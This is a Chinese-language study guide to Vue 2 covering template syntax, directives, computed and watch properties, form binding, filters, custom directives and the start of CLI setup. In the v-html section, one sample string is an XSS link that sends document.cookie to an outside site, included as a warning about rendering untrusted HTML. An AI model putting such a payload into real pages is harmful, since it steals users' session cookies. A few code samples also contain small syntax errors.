- [1.vue 基础](#1vue-基础)
  - [1.1 模板语法](#11-模板语法)
  - [1.2 数据绑定](#12-数据绑定)
  - [1.3 el 与 data 的两种写法](#13-el-与-data-的两种写法)
  - [1.4 数据代理](#14-数据代理)
    - [defineProperty](#defineproperty)
    - [getOwnPropertyDescriptor](#getownpropertydescriptor)
    - [Vue 中的数据代理](#vue-中的数据代理)
  - [1.5 事件处理](#15-事件处理)
    - [事件修饰符](#事件修饰符)
    - [键盘事件](#键盘事件)
  - [1.6 计算属性](#16-计算属性)
  - [1.7 监视属性](#17-监视属性)
  - [1.8 绑定样式](#18-绑定样式)
    - [class 样式](#class-样式)
    - [style 样式](#style-样式)
  - [条件渲染](#条件渲染)
    - [v-if](#v-if)
    - [v-show](#v-show)
  - [1.9 列表渲染](#19-列表渲染)
    - [v-for 指令](#v-for-指令)
  - [1.14 vm 检测 data 数据](#114-vm-检测-data-数据)
  - [1.10 收集表单数据](#110-收集表单数据)
  - [1.11 注册过滤器](#111-注册过滤器)
  - [1.12 内置指令](#112-内置指令)
  - [1.18 自定义指令](#118-自定义指令)
- [2. vue 脚手架](#2-vue-脚手架)
  - [2.1 脚手架](#21-脚手架)
    - [修改脚手架的默认配置](#修改脚手架的默认配置)
  - [2.2 基础知识](#22-基础知识)
    - [2.2.1 ref 属性](#221-ref-属性)
    - [2.2.2 props 配置项](#222-props-配置项)
    - [2.2.3 mixin(混入)](#223-mixin混入)
    - [2.2.4 插件](#224-插件)
    - [2.2.5 scoped 样式](#225-scoped-样式)
  - [2.3 组件自定义事件](#23-组件自定义事件)
  - [2.4 全局事件总线](#24-全局事件总线)
  - [2.5 消息订阅与发布 pubsub](#25-消息订阅与发布-pubsub)
  - [2.6 nextTick](#26-nexttick)
  - [2.7 slot 插槽](#27-slot-插槽)
  - [2.8 配置代理](#28-配置代理)
    - [方法一](#方法一)
    - [方法二](#方法二)
- [3. 插件](#3-插件)
  - [3.1 VUEX](#31-vuex)
  - [3.2 搭建 vuex 环境](#32-搭建-vuex-环境)
  - [3.3 基本使用](#33-基本使用)
  - [3.4 getters 的使用](#34-getters-的使用)
  - [3.5 四个 map 方法的使用](#35-四个-map-方法的使用)
  - [3.6 模块化+命名空间](#36-模块化命名空间)
- [4. 路由](#4-路由)
  - [4.1 基本使用](#41-基本使用)
  - [4.2 几个注意点](#42-几个注意点)
  - [4.3 多级路由（多级路由）](#43-多级路由多级路由)
  - [4.4 路由的 query 参数](#44-路由的-query-参数)
  - [4.5 命名路由](#45-命名路由)
  - [4.6 路由的 params 参数](#46-路由的-params-参数)
  - [4.7 路由的 props 配置](#47-路由的-props-配置)
  - [4.8 replace 属性](#48-replace-属性)
  - [4.9 编程式路由导航](#49-编程式路由导航)
  - [4.10 缓存路由组件](#410-缓存路由组件)
  - [4.11 两个新的生命周期钩子](#411-两个新的生命周期钩子)
  - [4.12 路由守卫](#412-路由守卫)
  - [4.13 路由器的两种工作模式](#413-路由器的两种工作模式)

# 1.vue 基础

## 1.1 模板语法

Vue 模板语法有 2 大类:

- 插值语法：
  功能：用于解析标签体内容
  写法：{{xxx}}，xxx 是 js 表达式，且可以直接读取到 data 中的所有属性

  ```html
  <h1>{{name.toUpperCase()}},{{address}} {{1+1}} {{Date.now()}}</h1>
  ```

- 指令语法:
  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
  举例：v-bind:href="xxx" 或 简写为 :href="xxx"，xxx 同样要写 js 表达式，且可以直接读取到 data 中的所有属性

  ```html
  <!--v-bind绑定指令，就把下面的url当成一个js表达式去执行了-->
  <a v-bind:href="url.toUpperCase()" v-bind:x="x">百度一下</a>
  <!-- v-bind: 还可以简写为: -->
  <a :href="url_taiwan" :x="x">google 台湾</a>
  ```

## 1.2 数据绑定

Vue 中有 2 种数据绑定的方式：

- 单向绑定(v-bind)：数据只能从 data 流向页面
- 双向绑定(v-model)：数据不仅能从 data 流向页面，还可以从页面流向 data

  > 注意: 1.双向绑定一般都应用在表单类元素上（如：input、select 等）
  > 2.v-model:value 可以简写为 v-model，因为 v-model 默认收集的就是 value 值

## 1.3 el 与 data 的两种写法

el 有 2 种写法

- new Vue 时候配置 el 属性
- 先创建 Vue 实例，随后再通过 vm.$mount('#root')指定 el 的值

```html
<script>
  // 第一种
  const vm = new Vue({
    el: "#root",
    data: {
      name: "jack",
    },
  });

  // 第二种
  vm.$mount("#root");
</script>
```

data 有 2 种写法

- 对象式
- 函数式

  > 在组件中，data 必须使用函数式

```html
<script>
     new Vue({
   el:'#root',
         // 第一种
   data:{
    name:'jack',
         }

         // 第二种
         data() {
          return {
                 name: 'jack'
             }
      }
  })
</script>
```

## 1.4 数据代理

### defineProperty

`Object.defineProperties(obj, props)`
作用：在对象上定义多个新的属性或者修改多个原有属性

props：
[[configurable]]:表示属性是否可以被 delete，以及其他 3 个属性描述符的值是否可以被修改，甚至改写成访问器属性(Vue 的 ObServer 就是这样进行数据劫持的)
[[enumerable]]:是否可枚举，是否能通过 for in 循环返回该属性
[[writable]]: 是否可修改
[[value]]:属性的数据值，默认是 undefined

```html
<script type="text/javascript">
  let number = 18;
  let person = {
    name: "张三",
    sex: "男",
  };

  Object.defineProperty(person, "age", {
    // value: 18,
    // enumerable: true, //此时代表这个属性是可以枚举的
    // writable: true, //代表可以重写该属性(控制属性是否被修改)
    // configurable:true, //控制属性是否可以被删除 默认为false

    //当读取person的age属性时get属性就会被调用，且返回值就是age的值
    //invoke property proxy映射数据代理
    get: function () {
      //测试它的调用情况
      console.log("@@@ GET AGE");
      //此时age的值依赖number的值
      return number;
    },
    //当修改person的age属性时set(setter)属性就会被调用，且会收到修改的具体值
    set(v) {
      //测试
      console.log("CHANGE AGE");
      number = v;
    },
  });

  // console.log(Object.keys(person))

  //遍历
  // for(var p  in  person){
  //     console.log('@@', person[p])
  // }
</script>
```

### getOwnPropertyDescriptor

```js
let user = {
  name: "John",
};

let descriptor = Object.getOwnPropertyDescriptor(user, "name");

console.log(descriptor);

/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/
```

### Vue 中的数据代理

- Vue 中的数据代理：通过 vm 对象来代理 data 对象中属性的操作（读/写）
- Vue 中数据代理的好处：更加方便的操作 data 中的数据
- 基本原理：
  - 通过 Object.defineProperty()把 data 对象中所有属性添加到 vm 上。
  - 为每一个添加到 vm 上的属性，都指定一个 getter/setter。
  - 在 getter/setter 内部去操作（读/写）data 中对应的属性。

## 1.5 事件处理

事件的基本使用：

- 使用 v-on:xxx 或 @xxx 绑定事件，其中 xxx 是事件名
- 事件的回调需要配置在 methods 对象中，最终会在 vm 上
- methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或组件实例对象

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- <button v-on:click="showInfo">点我提示信息</button> -->
  <button @click="showInfo1">点我提示信息1（不传参）</button>
  <!-- 主动传事件本身 $event是事件对象，要加上-->
  <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      name: "vue",
    },
    methods: {
      // 如果vue模板没有写event，会自动传 event 给函数
      showInfo1(event) {
        // console.log(event.target.innerText)
        // console.log(this) //此处的this是vm
        alert("同学你好！");
      },
      showInfo2(event, number) {
        console.log(event, number);
        // console.log(event.target.innerText)
        // console.log(this) //此处的this是vm
        alert("同学你好！！");
      },
    },
  });
</script>
```

### 事件修饰符

- prevent：阻止默认事件
- stop：阻止事件冒泡
- once：事件只触发一次
- capture：使用事件的捕获模式
- self：只有 event.target 是当前操作的元素时才触发事件
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
    />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>修饰符</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <style>
      * {
        margin: 20px;
      }
      .demo1 {
        height: 100px;
        background: deepskyblue;
      }
      .box1 {
        padding: 5px;
        background: deepskyblue;
      }
      .box2 {
        padding: 5px;
        background: orange;
      }
      .list {
        width: 200px;
        height: 200px;
        background: salmon;
        overflow: auto;
      }
      .list li {
        height: 100px;
      }
    </style>
  </head>
  <body>
    <!--
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
    <div id="root">
      <h1>欢迎来到 {{ name }}</h1>
      <!--阻止默认事件（常用-->
      <a href="https://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
      <!--阻止事件冒泡（常用）-->
      <div class="demo1" @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
        <!--修饰符也可以连用，例如下面事例是即阻止冒泡同时也阻止默认行为-->
        <!--<a href="https://www.google.com.tw" @click.prevent.stop="showInfo">谷歌台湾</a>-->
      </div>
      <!--事件只触发一次-->
      <button @click.once="showInfo">点我提示信息,只在第一次点击生效</button>
      <!-- capture事件的捕获模式 让事件以捕获的方式来处理(先捕获再冒泡)-->
      <div class="box1" @click.capture="showMsg(1)">
        div1
        <div class="box2" @click="showMsg(2)">div2</div>
      </div>
      <!-- self 只有event.target是当前操作的元素时才触发事件(变相阻止冒泡)-->
      <div class="demo1" @click.self="showInfo">
        <button @click="showInfo">点我提示信息</button>
      </div>
      <!--passive：事件的默认行为立即执行，无需等待事件回调执行完毕；-->
      <!--scroll滚动条一滚动就会触发的事件 wheel鼠标滚轮事件-->
      <ul class="list" @scroll.passive="demo">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
      </ul>
    </div>
    <script type="text/javascript">
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data() {
          return {
            name: "Shanghai",
          };
        },
        methods: {
          showInfo(e) {
            // e.preventDefault(); 阻止a标签默认行为
            // e.stopPropagation() //阻止事件冒泡
            // alert('你好');
            console.log(e.target);
          },
          showMsg(msg) {
            console.log(msg);
          },
          demo() {
            // console.log(`@`)
            // for(let i = 0; i < 100000; i++){
            //     console.log('#')
            // }
            // console.log('累了')
          },
        },
      });
    </script>
  </body>
</html>
```

### 键盘事件

键盘事件语法糖：@keydown，@keyup

Vue 中常用的按键别名：

- 回车 => enter
- 删除 => delete
- 退出 => esc
- 空格 => space
- 换行 => tab (特殊，必须配合 keydown 去使用)

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo" />
</div>

<script>
  new Vue({
    el: "#root",
    data: {
      name: "浙江理工大学",
    },
    methods: {
      showInfo(e) {
        // console.log(e.key,e.keyCode)
        console.log(e.target.value);
      },
    },
  });
</script>
```

## 1.6 计算属性

- 定义：要用的属性不存在，要通过已有属性计算得来
- 原理：底层借助了 Objcet.defineProperty 方法提供的 getter 和 setter
- get 函数什么时候执行？
  - (1).初次读取时会执行一次
  - (2).当依赖的数据发生改变时会被再次调用
- 优势：与 methods 实现相比，内部有缓存机制（复用），效率更高，调试方便
- 备注：
  - 计算属性最终会出现在 vm 上，直接读取使用即可
  - 如果计算属性要被修改，那必须写 set 函数去响应修改，且 set 中要引起计算时依赖的数据发生改变

```html
<!-- 准备好一个容器-->
<div id="root">
  姓：<input type="text" v-model="firstName" /> 名：<input
    type="text"
    v-model="lastName"
  />
  全名：<span>{{fullName}}</span>
</div>

<script>
  const vm = new Vue({
         el:'#root',
         data:{
             firstName:'张',
             lastName:'三',
         }
         computed:{
             fullName:{
                 get(){
                     console.log('get被调用了')
                     return this.firstName + '-' + this.lastName
                 },

                 set(value){
                     console.log('set',value)
                     const arr = value.split('-')
                     this.firstName = arr[0]
                     this.lastName = arr[1]
                 }
             }
             // 如果只需要get属性，可以简写成下面
             // computed:{
             //   fullName() {
             //       console.log('get被调用了')
             //       return this.firstName + '-' + this.lastName
             //       }
             //     }
         }
         // methods 方法实现
         // methods:{
         //        fullName(){
         //            return `${this.firstName.slice(0,3)} -- ${this.lastName}`
         //        }
         //    }
     })
</script>
```

## 1.7 监视属性

监视属性 watch：

- 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
- 监视的属性必须存在，才能进行监视
- 监视的两种写法：
  - (1).new Vue 时传入 watch 配置
  - (2).通过 vm.$watch 监视

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>今天天气很{{ info }}</h2>
  <button @click="changeWeather">切换天气</button>
</div>

<script>
  const vm = new Vue(
    {
      el: "#root",
      data: {
        isHot: true,
      },
      computed: {
        info() {
          return this.isHot ? "炎热" : "凉爽";
        },
      },
      methods: {
        changeWeather() {
          this.isHot = !this.isHot;
        },
      },
      watch: {
        isHot: {
          immediate: true, // 初始化时让handler调用一下
          // handler什么时候调用？当isHot发生改变时。
          handler(newValue, oldValue) {
            console.log("isHot被修改了", newValue, oldValue);
          },
        },

        // 简写
        // isHot(newValue, oldValue) {
        // console.log('isHot被修改了', newValue, oldValue, this)
        // }
      },
    }

    //  第三种写法
    // vm.$watch('isHot',{
    //     immediate:true, //初始化时让handler调用一下
    //     //handler什么时候调用？当isHot发生改变时。

    //     handler(newValue,oldValue){
    //         console.log('isHot被修改了',newValue,oldValue)
    //     }}
  );
</script>
```

**深度监视：**

- Vue 中的 watch 默认不监测对象内部值的改变（一层）
- 配置 deep:true 可以监测对象内部值改变（多层）

computed 和 watch 之间的区别：

- computed 能完成的功能，watch 都可以完成
- watch 能完成的功能，computed 不一定能完成，例如：watch 可以进行异步操作

> 两个重要的小原则： 1.所被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或 组件实例对象 2.所有不被 Vue 所管理的函数（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），最好写成箭头函数，这样 this 的指向才是 vm 或 组件实例对象

## 1.8 绑定样式

### class 样式

写法：`:class="xxx"` xxx 可以是字符串、对象、数。

所以分为三种写法，字符串写法，数组写法，对象写法

字符串写法

字符串写法适用于：类名不确定，要动态获取。

```html
<style>
  .normal {
    background-color: skyblue;
  }
</style>

<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
  <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      mood: "normal",
    },
  });
</script>
```

数组写法

数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。

```html
<style>
  .atguigu1 {
    background-color: yellowgreen;
  }
  .atguigu2 {
    font-size: 30px;
    text-shadow: 2px 2px 10px red;
  }
  .atguigu3 {
    border-radius: 20px;
  }
</style>

<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
  <div class="basic" :class="classArr">{{name}}</div>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      classArr: ["atguigu1", "atguigu2", "atguigu3"],
    },
  });
</script>
```

对象写法\*

对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<style>
  .atguigu1 {
    background-color: yellowgreen;
  }
  .atguigu2 {
    font-size: 30px;
    text-shadow: 2px 2px 10px red;
  }
</style>

<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
  <div class="basic" :class="classObj">{{name}}</div>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      classObj: {
        atguigu1: false,
        atguigu2: false,
      },
    },
  });
</script>
```

### style 样式

有两种写法，对象写法，数组写法

对象写法

```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定style样式--对象写法 -->
  <div class="basic" :style="styleObj">{{name}}</div>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      styleObj: {
        fontSize: "40px",
        color: "red",
      },
    },
  });
</script>
```

数组写法

```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定style样式--数组写法 -->
  <div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      styleArr: [
        {
          fontSize: "40px",
          color: "blue",
        },
        {
          backgroundColor: "gray",
        },
      ],
    },
  });
</script>
```

## 条件渲染

### v-if

- 写法：

  1. v-if="表达式"
  2. v-else-if="表达式"
  3. v-else="表达式"

- 适用于：切换频率较低的场景
- 特点：不展示的 DOM 元素直接被移除
- 注意：v-if 可以和:v-else-if、v-else 一起使用，但要求结构不能被“打断”

```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 使用v-if做条件渲染 -->
  <h2 v-if="false">欢迎来到{{name}}</h2>
  <h2 v-if="1 === 1">欢迎来到{{name}}</h2>

  <!-- v-else和v-else-if -->
  <div v-if="n === 1">Angular</div>
  <div v-else-if="n === 2">React</div>
  <div v-else-if="n === 3">Vue</div>
  <div v-else>哈哈</div>

  <!-- v-if与template的配合使用 -->
  <!-- 就不需要写好多个判断，写一个就行 -->
  <!-- 这里的思想就像事件代理的使用 -->
  <template v-if="n === 1">
    <h2>你好</h2>
    <h2>123</h2>
    <h2>北京</h2>
  </template>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      styleArr: [
        {
          fontSize: "40px",
          color: "blue",
        },
        {
          backgroundColor: "gray",
        },
      ],
    },
  });
</script>
```

### v-show

- 写法：v-show="表达式"
- 适用于：切换频率较高的场景
- 特点：不展示的 DOM 元素未被移除，仅仅是使用样式隐藏掉(display:none)

> 备注：使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到
> v-if 是实打实地改变 dom 元素，v-show 是隐藏或显示 dom 元素

```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 使用v-show做条件渲染 -->
  <h2 v-show="false">欢迎来到{{name}}</h2>
  <h2 v-show="1 === 1">欢迎来到{{name}}</h2>
</div>
```

## 1.9 列表渲染

### v-for 指令

- 用于展示列表数据
- 语法：v-for="(item, index) in xxx" :key="yyy"
- 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```html
<div id="root">
  <!-- 遍历数组 -->
  <h2>人员列表（遍历数组）</h2>
  <ul>
    <li v-for="(p,index) of persons" :key="index">{{p.name}}-{{p.age}}</li>
  </ul>

  <!-- 遍历对象 -->
  <h2>汽车信息（遍历对象）</h2>
  <ul>
    <li v-for="(value,k) of car" :key="k">{{k}}-{{value}}</li>
  </ul>

  <!-- 遍历字符串 -->
  <h2>测试遍历字符串（用得少）</h2>
  <ul>
    <li v-for="(char,index) of str" :key="index">{{char}}-{{index}}</li>
  </ul>

  <!-- 遍历指定次数 -->
  <h2>测试遍历指定次数（用得少）</h2>
  <ul>
    <li v-for="(number,index) of 5" :key="index">{{index}}-{{number}}</li>
  </ul>
</div>

<script>
  const vm = new Vue({
    el: "#root",
    data: {
      persons: [
        { id: "001", name: "张三", age: 18 },
        { id: "002", name: "李四", age: 19 },
        { id: "003", name: "王五", age: 20 },
      ],
      car: {
        name: "奥迪A8",
        price: "70万",
        color: "黑色",
      },
      str: "hello",
    },
  });
</script>
```

注意：

- 最好使用每条数据的唯一标识作为 key, 比如 id、手机号、身份证号、学号等唯一值
- 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用 index 作为 key 是没有问题的

## 1.14 vm 检测 data 数据

Vue 监视数据的原理：

- vue 会监视 data 中所有层次的数据

- 如何监测对象中的数据？

  通过 setter 实现监视，且要在 new Vue 时就传入要监测的数据。

  - 对象中后追加的属性，Vue 默认不做响应式处理

  - 如需给后添加的属性做响应式，请使用如下 API：

    Vue.set(target，propertyName/index，value) 或

    vm.$set(target，propertyName/index，value)

- 如何监测数组中的数据？

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  - 调用原生对应的方法对数组进行更新
  - 重新解析模板，进而更新页面

- 在 Vue 修改数组中的某个元素一定要用如下方法：

  - 使用这些 API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  - Vue.set() 或 vm.$set()

> 特别注意：Vue.set() 和 vm.$set() 不能给 vm 或 vm 的根数据对象 添加属性！！！

## 1.10 收集表单数据

若：`<input type="text"/>`，则 v-model 收集的是 value 值，用户输入的就是 value 值。

```html
<!-- 准备好一个容器-->
<div id="root">
  <form @submit.prevent="demo">
    账号：<input type="text" v-model.trim="userInfo.account" /> <br /><br />
    密码：<input type="password" v-model="userInfo.password" /> <br /><br />
    年龄：<input type="number" v-model.number="userInfo.age" /> <br /><br />
    <button>提交</button>
  </form>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false;

  new Vue({
    el: "#root",
    data: {
      userInfo: {
        account: "",
        password: "",
        age: 18,
      },
    },
    methods: {
      demo() {
        console.log(JSON.stringify(this.userInfo));
      },
    },
  });
</script>
```

若：`<input type="radio"/>`，则 v-model 收集的是 value 值，且要给标签配置 value 值。

```html
<!-- 准备好一个容器-->
<div id="root">
  <form @submit.prevent="demo">
    性别： 男<input
      type="radio"
      name="sex"
      v-model="userInfo.sex"
      value="male"
    />
    女<input type="radio" name="sex" v-model="userInfo.sex" value="female" />
  </form>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false;

  new Vue({
    el: "#root",
    data: {
      userInfo: {
        sex: "female",
      },
    },
    methods: {
      demo() {
        console.log(JSON.stringify(this.userInfo));
      },
    },
  });
</script>
```

若：`<input type="checkbox"/>`

- 没有配置 input 的 value 属性，那么收集的就是 checked（勾选 or 未勾选，是布尔值）
- 配置 input 的 value 属性:
  - v-model 的初始值是非数组，那么收集的就是 checked（勾选 or 未勾选，是布尔值）
  - v-model 的初始值是数组，那么收集的的就是 value 组成的数组

```html
<!-- 准备好一个容器-->
<div id="root">
  <form @submit.prevent="demo">
    爱好： 学习<input type="checkbox" v-model="userInfo.hobby" value="study" />
    打游戏<input type="checkbox" v-model="userInfo.hobby" value="game" />
    吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat" />
    <br /><br />
    所属校区
    <select v-model="userInfo.city">
      <option value="">请选择校区</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="shenzhen">深圳</option>
      <option value="wuhan">武汉</option>
    </select>
    <br /><br />
    其他信息：
    <textarea v-model.lazy="userInfo.other"></textarea> <br /><br />
    <input type="checkbox" v-model="userInfo.agree" />阅读并接受<a
      href="http://www.atguigu.com"
      >《用户协议》</a
    >
    <button>提交</button>
  </form>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false;

  new Vue({
    el: "#root",
    data: {
      userInfo: {
        hobby: [],
        city: "beijing",
        other: "",
        agree: "",
      },
    },
    methods: {
      demo() {
        console.log(JSON.stringify(this.userInfo));
      },
    },
  });
</script>
```

> 备注：v-model 的三个修饰符：
> lazy：失去焦点再收集数据
> number：输入字符串转为有效的数字
> trim：输入首尾空格过滤

## 1.11 注册过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

**语法：**

- 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
- 使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>显示格式化后的时间</h2>
  <!-- 计算属性实现 -->
  <h3>现在是：{{ fmtTime }}</h3>
  <!-- methods实现 -->
  <h3>现在是：{{ getFmtTime() }}</h3>
  <!-- 过滤器实现 -->
  <h3>现在是：{{time | timeFormater}}</h3>
  <!-- 过滤器实现（传参） -->
  <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
  <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false;
  //全局过滤器
  Vue.filter("mySlice", function (value) {
    return value.slice(0, 4);
  });

  new Vue({
    el: "#root",
    data: {
      time: 1621561377603, //时间戳
      msg: "你好，",
    },
    computed: {
      fmtTime() {
        return dayjs(this.time).format("YYYY年MM月DD日 HH:mm:ss");
      },
    },
    methods: {
      getFmtTime() {
        return dayjs(this.time).format("YYYY年MM月DD日 HH:mm:ss");
      },
    },
    //局部过滤器
    filters: {
      timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
        // console.log('@',value)
        return dayjs(value).format(str);
      },
    },
  });
</script>
```

> 备注：
>
> 1. 过滤器也可以接收额外参数、多个过滤器也可以串联
> 2. 并没有改变原本的数据, 是产生新的对应的数据

## 1.12 内置指令

**v-text 指令：**(使用的比较少)

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text 会替换掉节点中的内容，{{xx}}则不会。

```html
<!-- 准备好一个容器-->
<div id="root">
  <div>你好，{{name}}</div>
  <div v-text="name"></div>
  <div v-text="str"></div>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。

  new Vue({
    el: "#root",
    data: {
      name: "张三",
      str: "<h3>你好啊！</h3>",
    },
  });
</script>
```

**v-html 指令：**(使用的很少)

1.作用：向指定节点中渲染包含 html 结构的内容。

2.与插值语法的区别：

- v-html 会替换掉节点中所有的内容，{{xx}}则不会。
- v-html 可以识别 html 结构。

  3.严重注意：v-html 有安全性问题！！！！

- 在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击。
- 一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上！

```js
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

**v-cloak 指令（没有值）：**

- 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性。
- 使用 css 配合 v-cloak 可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
  [v-cloak] {
    display: none;
  }
</style>
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-cloak>{{name}}</h2>
</div>
<script
  type="text/javascript"
  src="http://localhost:8080/resource/5s/vue.js"
></script>

<script type="text/javascript">
  console.log(1);
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。

  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
    },
  });
</script>
```

**v-once 指令：**(用的少)

- v-once 所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能。

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-once>初始化的n值是:{{ n }}</h2>
  <h2>当前的n值是:{{ n }}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。

  new Vue({
    el: "#root",
    data: {
      n: 1,
    },
  });
</script>
```

**v-pre 指令：**(比较没用)

- 跳过其所在节点的编译过程
- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-pre>Vue其实很简单</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。

  new Vue({
    el: "#root",
    data: {
      n: 1,
    },
  });
</script>
```

## 1.18 自定义指令

需求 1：定义一个 v-big 指令，和 v-text 功能类似，但会把绑定的数值放大 10 倍。

需求 2：定义一个 v-fbind 指令，和 v-bind 功能类似，但可以让其所绑定的 input 元素默认获取焦点。

配置对象中常用的 3 个回调：

- bind：指令与元素成功绑定时调用。
- inserted：指令所在元素被插入页面时调用。
- update：指令所在模板结构被重新解析时调用。

element:dom 元素
binding:绑定值的对象

定义全局指令

```html
<!-- 准备好一个容器-->
<div id="root">
  <input type="text" v-fbind:value="n" />
</div>

<script type="text/javascript">
  Vue.config.productionTip = false;

  //定义全局指令
  Vue.directive("fbind", {
    // 指令与元素成功绑定时（一上来）
    bind(element, binding) {
      element.value = binding.value;
    },
    // 指令所在元素被插入页面时
    inserted(element, binding) {
      element.focus();
    },
    // 指令所在的模板被重新解析时
    update(element, binding) {
      element.value = binding.value;
    },
  });

  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
      n: 1,
    },
  });
</script>
```

局部指令：

```js
new Vue({
  el: "#root",
  data: {
    name: "sgg",
    n: 1,
  },
  directives: {
    // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
    /* 'big-number'(element,binding){
     // console.log('big')
     element.innerText = binding.value * 10
    }, */
    big(element, binding) {
      console.log("big", this); //注意此处的this是window
      // console.log('big')
      element.innerText = binding.value * 10;
    },
    fbind: {
      //指令与元素成功绑定时（一上来）
      bind(element, binding) {
        element.value = binding.value;
      },
      //指令所在元素被插入页面时
      inserted(element, binding) {
        element.focus();
      },
      //指令所在的模板被重新解析时
      update(element, binding) {
        element.value = binding.value;
      },
    },
  },
});
```

# 2. vue 脚手架

## 2.1 脚手架

使用前置：

第一步(没有安装过的执行)：全局安装 @vue/cli

npm install -g @vue/cli

第二步：切换到要创建项目的目录，然后使用命令创建项目

vue create xxxxx

第三步：启动项目

npm run serve

### 修改脚手架的默认配置

- `使用vue inspect > output.js`可以查看到 Vue 脚手架的默认配置。
